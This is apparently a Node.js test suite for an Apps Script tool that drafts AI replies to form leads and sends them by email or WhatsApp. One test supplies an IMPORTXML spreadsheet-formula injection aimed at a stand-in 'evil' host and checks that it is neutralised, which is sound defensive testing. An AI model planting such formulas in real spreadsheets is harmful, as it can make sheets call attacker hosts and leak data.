/* Offline tests: loads Code.gs into a sandbox with mocked Apps Script services.
 * Run: node test/run-tests.js
 */
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const assert = require('assert');
const crypto = require('crypto');

const SOURCE = fs.readFileSync(path.join(__dirname, '..', 'Code.gs'), 'utf8');

function makeEnv(opts) {
  opts = opts || {};
  const sheets = {};
  const calls = { fetch: [], emails: [], drafts: [], triggers: [], sleeps: [] };
  const props = Object.assign({
    ANTHROPIC_API_KEY: 'test-key',
    BUSINESS_NAME: 'Acme Studio',
    BUSINESS_CONTEXT: 'Short-form video agency.',
    SENDER_NAME: 'Asha',
  }, opts.props || {});

  function makeSheet(name) {
    const rows = [];
    return {
      name, rows,
      getLastRow: () => rows.length,
      appendRow: (r) => rows.push(r.slice()),
      setFrozenRows: () => {},
      getRange: (row, col, nr, nc) => ({
        setFontWeight: () => {},
        setValues: (vals) => { rows[row - 1] = vals[0].slice(); },
      }),
      getDataRange: () => ({ getValues: () => rows.map((r) => r.slice()) }),
    };
  }

  const ss = {
    getId: () => 'sheet-id',
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => (sheets[n] = makeSheet(n)),
  };

  const responses = (opts.responses || []).slice();
  const ctx = {
    console: { log: () => {}, error: () => {} },
    SpreadsheetApp: {
      getActive: () => ss,
      getUi: () => { throw new Error('no ui'); },
    },
    PropertiesService: { getScriptProperties: () => ({ getProperties: () => props }) },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    Utilities: { getUuid: () => crypto.randomUUID(), sleep: (ms) => calls.sleeps.push(ms) },
    UrlFetchApp: {
      fetch: (url, options) => {
        calls.fetch.push({ url, options, payload: JSON.parse(options.payload) });
        const r = responses.length > 1 ? responses.shift() : responses[0];
        return {
          getResponseCode: () => r.code,
          getContentText: () => JSON.stringify(r.body),
          getHeaders: () => r.headers || {},
        };
      },
    },
    GmailApp: {
      sendEmail: (to, subject, body, o) => calls.emails.push({ to, subject, body, o }),
      createDraft: (to, subject, body, o) => calls.drafts.push({ to, subject, body, o }),
    },
    ScriptApp: {
      getProjectTriggers: () => calls.triggers,
      newTrigger: (fn) => ({ forSpreadsheet: () => ({ onFormSubmit: () => ({
        create: () => calls.triggers.push({ getHandlerFunction: () => fn }),
      }) }) }),
    },
    Session: { getActiveUser: () => ({ getEmail: () => 'owner@example.com' }) },
  };
  vm.createContext(ctx);
  vm.runInContext(SOURCE + '\nthis.LOG_HEADERS = LOG_HEADERS;', ctx);
  return { ctx, calls, sheets, log: () => sheets['Leads Log'] };
}

const AI_OUTPUT = {
  lead_score: 'hot',
  lead_summary: 'Cafe opening in Pune wants short-form video soon.',
  email_subject: 'Videos for your Pune launch, Priya',
  email_body: 'Hi Priya,\n\nCongrats on the new outlet...\n\nAsha\nAcme Studio',
  whatsapp_message: 'Hi Priya! Asha from Acme Studio here 👋 Loved hearing about the Pune launch...',
};

function okResponse(ai) {
  return {
    code: 200,
    body: {
      model: 'claude-opus-5-5',
      stop_reason: 'end_turn',
      content: [{ type: 'thinking', thinking: '' }, { type: 'text', text: JSON.stringify(ai || AI_OUTPUT) }],
    },
  };
}

function formEvent(overrides) {
  const a = Object.assign({
    'Timestamp': '19/11/2026 10:00:00',
    'Full name': 'Priya Sharma',
    'Email address': 'priya@example.com',
    'WhatsApp number (with country code)': '+91 98765 43210',
    'Company / brand': 'Chai & Co.',
    'What are you interested in?': 'Instagram reels for a new outlet',
    'Anything else we should know?': 'Opening next month',
    'Preferred contact method': 'Email',
  }, overrides || {});
  const nv = {};
  Object.keys(a).forEach((k) => { if (a[k] !== null) nv[k] = [a[k]]; });
  return { namedValues: nv };
}

const col = (name, row, env) => row[env.ctx.LOG_HEADERS.indexOf(name)];
const tests = [];
const test = (name, fn) => tests.push({ name, fn });

// ---------------------------------------------------------------------------

test('email lead: calls Claude correctly, sends email, logs row', () => {
  const env = makeEnv({ responses: [okResponse()] });
  env.ctx.handleFormSubmit(formEvent());

  assert.strictEqual(env.calls.fetch.length, 1);
  const req = env.calls.fetch[0];
  assert.strictEqual(req.url, 'https://api.anthropic.com/v1/messages');
  assert.strictEqual(req.options.headers['x-api-key'], 'test-key');
  assert.strictEqual(req.options.headers['anthropic-version'], '2026-10-21');
  assert.strictEqual(req.payload.model, 'claude-opus-5-5');
  assert.strictEqual(req.payload.output_config.format.type, 'json_schema');
  assert.strictEqual(req.payload.fallbacks, 'default');
  assert.ok(req.payload.system.includes('Acme Studio'));
  assert.ok(req.payload.messages[0].content.includes('Instagram reels for a new outlet'));
  assert.ok(req.payload.messages[0].content.includes('Chai & Co.'));

  assert.strictEqual(env.calls.emails.length, 1);
  assert.strictEqual(env.calls.emails[0].to, 'priya@example.com');
  assert.strictEqual(env.calls.emails[0].subject, AI_OUTPUT.email_subject);
  assert.strictEqual(env.calls.emails[0].o.name, 'Asha | Acme Studio');

  const log = env.log();
  assert.deepStrictEqual(log.rows[0], env.ctx.LOG_HEADERS);
  assert.strictEqual(log.rows.length, 2);
  const row = log.rows[1];
  assert.strictEqual(col('Name', row, env), 'Priya Sharma');
  assert.strictEqual(col('Lead Score', row, env), 'hot');
  assert.strictEqual(col('Email Body', row, env), AI_OUTPUT.email_body);
  assert.strictEqual(col('Delivery Status', row, env), 'SENT');
  assert.ok(col('WhatsApp Link', row, env).startsWith('https://wa.me/919876543210?text=Hi%20Priya'));
});

test('WhatsApp lead (link mode): no email sent, click-to-chat link logged', () => {
  const env = makeEnv({ responses: [okResponse()] });
  env.ctx.handleFormSubmit(formEvent({ 'Preferred contact method': 'WhatsApp' }));
  assert.strictEqual(env.calls.emails.length, 0);
  const row = env.log().rows[1];
  assert.strictEqual(col('Delivery Channel', row, env), 'WhatsApp');
  assert.match(col('Delivery Status', row, env), /^READY/);
});

test('WhatsApp lead (cloud_api + template): sends template to Graph API', () => {
  const env = makeEnv({
    props: { WHATSAPP_MODE: 'cloud_api', WHATSAPP_TOKEN: 'wa', WHATSAPP_PHONE_NUMBER_ID: '123',
      WHATSAPP_TEMPLATE_NAME: 'lead_reply' },
    responses: [okResponse(Object.assign({}, AI_OUTPUT, { whatsapp_message: 'Hi Priya!\n\nLine two' })),
      { code: 200, body: { messages: [{ id: 'wamid.X' }] } }],
  });
  env.ctx.handleFormSubmit(formEvent({ 'Preferred contact method': 'WhatsApp' }));
  const wa = env.calls.fetch[1];
  assert.strictEqual(wa.url, 'https://graph.facebook.com/v21.0/123/messages');
  assert.strictEqual(wa.options.headers.Authorization, 'Bearer wa');
  assert.strictEqual(wa.payload.to, '919876543210');
  assert.strictEqual(wa.payload.template.name, 'lead_reply');
  assert.strictEqual(wa.payload.template.components[0].parameters[0].text, 'Hi Priya! Line two');
  assert.strictEqual(col('Delivery Status', env.log().rows[1], env), 'SENT (Cloud API wamid.X)');
});

test('draft mode creates a Gmail draft instead of sending', () => {
  const env = makeEnv({ props: { EMAIL_MODE: 'draft' }, responses: [okResponse()] });
  env.ctx.handleFormSubmit(formEvent());
  assert.strictEqual(env.calls.emails.length, 0);
  assert.strictEqual(env.calls.drafts.length, 1);
});

test('retries on 529 overload then succeeds', () => {
  const env = makeEnv({ responses: [
    { code: 529, body: { error: { message: 'Overloaded' } } },
    { code: 429, body: { error: { message: 'rate' } }, headers: { 'retry-after': '3' } },
    okResponse(),
  ] });
  env.ctx.handleFormSubmit(formEvent());
  assert.strictEqual(env.calls.fetch.length, 3);
  assert.deepStrictEqual(env.calls.sleeps, [2000, 3000]);
  assert.strictEqual(col('Delivery Status', env.log().rows[1], env), 'SENT');
});

test('API error is logged (lead not lost) and retryFailed reprocesses it', () => {
  const env = makeEnv({ responses: [{ code: 401, body: { error: { message: 'invalid x-api-key' } } }] });
  env.ctx.handleFormSubmit(formEvent());
  let row = env.log().rows[1];
  assert.strictEqual(col('Delivery Status', row, env), 'ERROR: AI generation failed');
  assert.match(col('Error', row, env), /HTTP 401.*invalid x-api-key/);
  assert.strictEqual(col('Email', row, env), 'priya@example.com');
  assert.strictEqual(env.calls.emails.length, 0);

  // Fix the key, then retry: same row is updated in place.
  const env2Responses = [okResponse()];
  env.ctx.UrlFetchApp.fetch = (url, options) => {
    const r = env2Responses[0];
    return { getResponseCode: () => r.code, getContentText: () => JSON.stringify(r.body), getHeaders: () => ({}) };
  };
  const leadId = col('Lead ID', row, env);
  env.ctx.retryFailed();
  assert.strictEqual(env.log().rows.length, 2);
  row = env.log().rows[1];
  assert.strictEqual(col('Delivery Status', row, env), 'SENT');
  assert.strictEqual(col('Lead ID', row, env), leadId);
  assert.strictEqual(env.calls.emails.length, 1);
});

test('refusal stop_reason is reported, not crashed', () => {
  const env = makeEnv({ responses: [{ code: 200, body: { stop_reason: 'refusal',
    stop_details: { category: 'general_harms' }, content: [] } }] });
  env.ctx.handleFormSubmit(formEvent());
  assert.match(col('Error', env.log().rows[1], env), /declined.*general_harms/);
});

test('missing API key is logged as an error', () => {
  const env = makeEnv({ props: { ANTHROPIC_API_KEY: '' }, responses: [okResponse()] });
  env.ctx.handleFormSubmit(formEvent());
  assert.match(col('Error', env.log().rows[1], env), /ANTHROPIC_API_KEY/);
  assert.strictEqual(env.calls.fetch.length, 0);
});

test('custom form titles are mapped by pattern; unknown questions go to message', () => {
  const env = makeEnv({ responses: [okResponse()] });
  env.ctx.handleFormSubmit({ namedValues: {
    'Timestamp': ['x'], 'Your Name': ['Ravi'], 'E-mail': ['ravi@example.com'],
    'Phone': ['09876543210'], 'Business name': ['Ravi Motors'],
    'Which service are you looking for?': ['SEO'], 'Budget range': ['50k-1L'],
    'How should we reach you?': ['WhatsApp'],
  } });
  const row = env.log().rows[1];
  assert.strictEqual(col('Name', row, env), 'Ravi');
  assert.strictEqual(col('Email', row, env), 'ravi@example.com');
  assert.strictEqual(col('Company', row, env), 'Ravi Motors');
  assert.strictEqual(col('Interest', row, env), 'SEO');
  assert.strictEqual(col('Message', row, env), 'Budget range: 50k-1L');
  assert.strictEqual(col('Preferred Channel', row, env), 'WhatsApp');
});

test('formula injection in form answers is neutralised in the sheet', () => {
  const env = makeEnv({ responses: [okResponse()] });
  env.ctx.handleFormSubmit(formEvent({ 'Company / brand': '=IMPORTXML("http://evil","//a")' }));
  assert.strictEqual(col('Company', env.log().rows[1], env), '\'=IMPORTXML("http://evil","//a")');
});

test('phone normalisation', () => {
  const env = makeEnv({ props: { DEFAULT_COUNTRY_CODE: '91' } });
  const n = env.ctx.normalizePhone_;
  assert.strictEqual(n('+91 98765-43210', '91'), '919876543210');
  assert.strictEqual(n('0044 7700 900123', '91'), '447700900123');
  assert.strictEqual(n('9876543210', '91'), '919876543210');
  assert.strictEqual(n('09876543210', '91'), '919876543210');
  assert.strictEqual(n('9876543210', ''), '9876543210');
});

function groqResponse(ai, finish) {
  return { code: 200, body: { model: 'openai/gpt-oss-120b',
    choices: [{ finish_reason: finish || 'stop', message: { role: 'assistant', content: JSON.stringify(ai || AI_OUTPUT) } }] } };
}

test('groq: picked automatically when only GROQ_API_KEY is set', () => {
  const env = makeEnv({ props: { ANTHROPIC_API_KEY: '', GROQ_API_KEY: 'gsk_test' }, responses: [groqResponse()] });
  env.ctx.handleFormSubmit(formEvent());
  const req = env.calls.fetch[0];
  assert.strictEqual(req.url, 'https://api.groq.com/openai/v1/chat/completions');
  assert.strictEqual(req.options.headers.Authorization, 'Bearer gsk_test');
  assert.strictEqual(req.payload.model, 'openai/gpt-oss-120b');
  assert.strictEqual(req.payload.response_format.type, 'json_schema');
  assert.strictEqual(req.payload.response_format.json_schema.strict, true);
  assert.strictEqual(req.payload.reasoning_effort, 'low');
  assert.strictEqual(req.payload.include_reasoning, false);
  assert.strictEqual(req.payload.messages[0].role, 'system');
  assert.ok(req.payload.messages[1].content.includes('Instagram reels'));

  const row = env.log().rows[1];
  assert.strictEqual(col('Delivery Status', row, env), 'SENT');
  assert.strictEqual(col('Model', row, env), 'groq:openai/gpt-oss-120b');
  assert.strictEqual(env.calls.emails[0].subject, AI_OUTPUT.email_subject);
});

test('groq: AI_PROVIDER override + custom non-reasoning model', () => {
  const env = makeEnv({ props: { AI_PROVIDER: 'groq', GROQ_API_KEY: 'g', GROQ_MODEL: 'qwen/qwen3.6-27b' },
    responses: [groqResponse()] });
  env.ctx.handleFormSubmit(formEvent());
  const p = env.calls.fetch[0].payload;
  assert.strictEqual(p.model, 'qwen/qwen3.6-27b');
  assert.strictEqual(p.reasoning_effort, undefined);
});

test('groq: truncated output and incomplete JSON are logged as errors', () => {
  let env = makeEnv({ props: { AI_PROVIDER: 'groq', GROQ_API_KEY: 'g' }, responses: [groqResponse(null, 'length')] });
  env.ctx.handleFormSubmit(formEvent());
  assert.match(col('Error', env.log().rows[1], env), /cut off/);

  env = makeEnv({ props: { AI_PROVIDER: 'groq', GROQ_API_KEY: 'g' },
    responses: [groqResponse({ lead_score: 'hot' })] });
  env.ctx.handleFormSubmit(formEvent());
  assert.match(col('Error', env.log().rows[1], env), /missing "lead_summary"/);
  assert.strictEqual(env.calls.emails.length, 0);
});

test('groq: HTTP error message surfaces in the log', () => {
  const env = makeEnv({ props: { AI_PROVIDER: 'groq', GROQ_API_KEY: 'bad' },
    responses: [{ code: 401, body: { error: { message: 'Invalid API Key' } } }] });
  env.ctx.handleFormSubmit(formEvent());
  assert.match(col('Error', env.log().rows[1], env), /HTTP 401 from api.groq.com: Invalid API Key/);
});

test('setup installs the trigger once', () => {
  const env = makeEnv();
  env.ctx.setup();
  env.ctx.setup();
  assert.strictEqual(env.calls.triggers.length, 1);
  assert.ok(env.log());
});

// ---------------------------------------------------------------------------

let failed = 0;
for (const t of tests) {
  try { t.fn(); console.log('PASS  ' + t.name); }
  catch (e) { failed++; console.log('FAIL  ' + t.name + '\n      ' + e.stack.split('\n').slice(0, 3).join('\n      ')); }
}
console.log('\n' + (tests.length - failed) + '/' + tests.length + ' passed');
process.exit(failed ? 1 : 0);
